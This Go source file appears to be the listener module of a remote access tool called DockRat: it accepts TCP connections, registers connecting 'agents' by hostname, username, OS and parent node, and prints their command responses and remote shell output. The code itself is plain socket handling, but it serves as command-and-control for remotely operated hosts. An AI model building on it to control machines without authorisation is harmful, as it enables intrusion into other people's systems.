package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/utils"
)

type HandshakePayload struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	ParentID int    `json:"parent_id"` // 初始为 -1，表示没有父节点
}

func StartListener(addr string, registry *node.Registry) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
	}
	log.Printf("[+] Listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn, registry)
	}
}

func handleConnection(conn net.Conn, registry *node.Registry) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := utils.BytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
			ParentID: payload.ParentID,
		}
		id := registry.Add(n)
		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)

		go handleAgentMessages(n, registry)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node, registry *node.Registry) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := utils.BytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
		case protocol.MsgShell:
			fmt.Print(string(msg.Payload))
		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
		}
	}
}
